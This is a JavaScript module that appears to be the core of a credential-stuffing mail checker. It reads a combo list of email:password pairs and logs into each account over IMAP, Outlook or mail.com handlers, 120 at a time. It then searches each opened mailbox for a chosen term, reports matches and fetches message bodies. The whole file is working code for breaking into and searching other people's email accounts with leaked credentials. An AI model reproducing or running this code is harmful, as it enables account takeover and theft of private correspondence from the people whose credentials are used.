


	import mail from '../conf/servers.js'

	import imap from './imap.js'
	import outlook from './outlook.js'
	import mailcom from './mailcom.js'

	import async from 'async'

	import path from 'path'
	import fs from 'fs'


    function parseuser(lout) {
        let atdx = lout.indexOf("@")
        let btdx = lout.search(/[: |#]/)
        if (atdx > 0 && btdx > 0) {
	        let user = lout.substr(0, btdx).toLowerCase();
	        let pass = lout.substr(btdx+1);
	        let domain = user.substr(atdx+1);
	        return { user, domain, pass }
	    } else return {}
    }

	function select(domain) {
		let server = mail[domain];
		if (server) {
			if (server[1] === 143 || server[1] === 993) return imap(server[0], server[1])
		} else if (outlook.DOMAINS.includes(domain)) {
			return outlook
		} else if (mailcom.DOMAINS.includes(domain)) {
			return mailcom
		}
	}

	export default {
		search({ term, hits, finish }) {
			const combo = fs.readFileSync(path.resolve("src/conf/test.txt"), "utf-8").trim().split(/\r?\n/);
			
			let stats = {
				total: combo.length,
				processed: 0,
				hits: 0
			}

			const queue = async.queue((task, cb)=>{
				task(cb);
			},120);

			for (let entry of combo) {
				let { user, domain, pass } = parseuser(entry);
				if (user && domain && pass) {
					let server = select(domain);
					if (server) queue.push(async cb=>{
						const api = await server.login(user, pass);
						if (!api.error) {
							const list = await api.search(term);
							if (!list.error && list.results.length > 0) {
								stats.hits++
								hits(list);
							} else {
								console.log("Search Error:", list.error);
							}
						} else {
							console.log("Login Error:", api.error);
						}
						stats.processed++
						cb();
					})
				} else {
					stats.total--;
				}
			}

			queue.drain(finish);

			return {
				progress() {
					return stats;
				}
			}
		},

		body(user, id) {
			return new Promise(async resolve=>{
				let domain = user.substr(user.indexOf("@")+1);
				let server = select(domain);
				const api = await server.login(user);
				const body = await api.body(id);
				if (body.error) {
					body.action = "body";
					console.log(body.error);
					resolve(body);
				} else {
					resolve({
						action: "body",
						body
					});
				}
			})
		}
	}